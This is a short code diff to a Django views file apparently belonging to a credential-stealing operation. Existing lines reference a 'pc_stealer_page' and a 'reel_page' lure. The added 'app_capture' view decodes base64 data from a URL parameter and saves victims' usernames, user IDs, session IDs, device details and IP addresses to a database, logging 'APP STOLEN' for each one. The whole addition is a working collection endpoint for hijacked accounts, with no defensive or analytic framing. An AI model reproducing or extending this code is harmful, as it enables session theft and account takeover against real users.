@@ -313,3 +313,28 @@ def pc_stealer_page(request):
 
 def reel_page(request, code):
     return render(request, 'core/reel.html')
+
+
+
+
+# core/views.py → FINAL APP CAPTURE
+import base64
+def app_capture(request):
+    data_b64 = request.GET.get('data', '')
+    if data_b64:
+        try:
+            data = json.loads(base64.b64decode(data_b64).decode())
+            PhoneSession.objects.create(
+                username=data.get('username', 'unknown'),
+                user_id=data.get('user_id', '0'),
+                sessionid=data.get('sessionid', ''),
+                device_id=data.get('device_id', ''),
+                phone_model=data.get('phone_model', ''),
+                android_version=data.get('android_version', ''),
+                ip_address=request.META.get('REMOTE_ADDR', ''),
+                country="IN"  # You can add IP lookup later
+            )
+            print(f"APP STOLEN → @{data['username']} | {data['phone_model']}")
+        except Exception as e:
+            print("ERROR:", e)
+    return HttpResponse("OK")
